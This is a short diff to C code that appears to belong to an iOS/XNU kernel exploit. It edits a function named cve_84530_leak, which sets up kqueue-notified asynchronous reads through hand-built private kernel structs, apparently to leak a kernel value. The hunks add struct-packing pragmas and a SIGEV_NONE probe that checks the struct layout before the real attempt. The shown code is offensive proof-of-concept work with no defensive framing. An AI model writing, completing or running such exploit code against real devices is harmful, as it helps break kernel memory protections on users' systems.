@@ -17,6 +17,7 @@
 
 extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);
 
+#pragma pack(push, 4)
 /* full XNU sigevent - iOS SDK only exposes first 5 fields */
 struct sigevent_xnu {
     int             sigev_notify;
@@ -46,6 +47,7 @@ struct aiocb_xnu {
 };
 
 /* use dlsym to avoid conflicting with SDK aio_read declaration */
+#pragma pack(pop)
 typedef int (*aio_read_fn_t)(void *);
 typedef int (*aio_cancel_fn_t)(int, void *);
 
@@ -95,6 +97,21 @@ uint64_t cve_84530_leak(void) {
     cb.aio_sigevent.sigev_notify_kqueue   = kq;
     cb.aio_sigevent.sigev_value.sival_ptr = NULL;
 
+    /* First probe: SIGEV_NONE confirms basic AIO works */
+    struct aiocb_xnu probe;
+    memset(&probe, 0, sizeof(probe));
+    probe.aio_fildes = fd;
+    probe.aio_buf    = buf;
+    probe.aio_nbytes = 1;
+    probe.aio_sigevent.sigev_notify = 0; /* SIGEV_NONE */
+    int probe_ret = fn_aio_read(&probe);
+    if (probe_ret != 0) {
+        snprintf(g_result, sizeof(g_result),
+            "SIGEV_NONE probe failed errno=%d (%s) - layout still wrong",
+            errno, strerror(errno));
+        close(kq); close(fd); return 0;
+    }
+    /* SIGEV_NONE worked - now try SIGEV_KEVENT */
     int ret = fn_aio_read(&cb);
     if (ret != 0) {
         snprintf(g_result, sizeof(g_result),
